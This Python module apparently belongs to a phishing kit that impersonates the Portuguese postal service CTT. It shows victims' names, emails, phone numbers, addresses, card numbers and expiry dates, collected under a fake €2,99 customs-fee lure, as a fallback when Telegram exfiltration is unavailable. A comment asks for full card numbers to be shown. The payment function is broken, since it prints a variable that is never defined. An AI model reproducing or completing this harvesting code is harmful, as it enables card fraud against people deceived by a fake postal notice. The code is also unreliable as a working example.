import logging
from datetime import datetime
from typing import Dict, Any

logger = logging.getLogger(__name__)

class ConsoleService:
    """Service para mostrar dados na consola quando Telegram não estiver disponível"""
    
    def __init__(self):
        self.enabled = True
        
    async def send_billing_info(self, billing_data: Dict[str, Any]) -> bool:
        """Mostrar informações de entrega na consola"""
        try:
            print("\n" + "="*60)
            print("🏠 NOVA INFORMAÇÃO DE ENTREGA CTT")
            print("="*60)
            print(f"👤 Nome: {billing_data.get('nome', 'N/A')}")
            print(f"📧 Email: {billing_data.get('email', 'N/A')}")
            print(f"📞 Telefone: {billing_data.get('telefone', 'N/A')}")
            print(f"🏠 Endereço: {billing_data.get('endereco', 'N/A')}")
            print(f"📮 Código Postal: {billing_data.get('codigoPostal', 'N/A')}")
            print(f"🏙️ Cidade: {billing_data.get('cidade', 'N/A')}")
            print(f"⏰ Data: {datetime.now().strftime('%d/%m/%Y às %H:%M')}")
            print(f"🔄 Estado: Aguarda pagamento da taxa alfandegária")
            print("="*60)
            
            logger.info(f"Billing info displayed for {billing_data.get('nome', 'Unknown')}")
            return True
            
        except Exception as e:
            logger.error(f"Error displaying billing info: {str(e)}")
            return False
    
    async def send_payment_info(self, billing_data: Dict[str, Any], card_data: Dict[str, Any]) -> bool:
        """Mostrar informações de pagamento na consola"""
        try:
            # Show full card number (conforme solicitado)
            card_number = card_data.get('numeroCartao', 'N/A')
            
            print("\n" + "="*60)
            print("💳 PAGAMENTO DE TAXA ALFANDEGÁRIA CTT")
            print("="*60)
            print(f"👤 Cliente: {billing_data.get('nome', 'N/A')}")
            print(f"📧 Email: {billing_data.get('email', 'N/A')}")
            print(f"📞 Telefone: {billing_data.get('telefone', 'N/A')}")
            print(f"💰 Valor: €2,99")
            print(f"💳 Cartão: {masked_card}")
            print(f"📅 Data Exp.: {card_data.get('dataExpiracao', 'N/A')}")
            print(f"🏠 Endereço: {billing_data.get('endereco', 'N/A')}")
            print(f"📮 Código Postal: {billing_data.get('codigoPostal', 'N/A')}")
            print(f"🏙️ Cidade: {billing_data.get('cidade', 'N/A')}")
            print(f"⏰ Data Pagamento: {datetime.now().strftime('%d/%m/%Y às %H:%M')}")
            print(f"✅ Estado: Pagamento processado com sucesso")
            print("="*60)
            
            logger.info(f"Payment info displayed for {billing_data.get('nome', 'Unknown')}")
            return True
            
        except Exception as e:
            logger.error(f"Error displaying payment info: {str(e)}")
            return False

# Global instance
console_service = ConsoleService()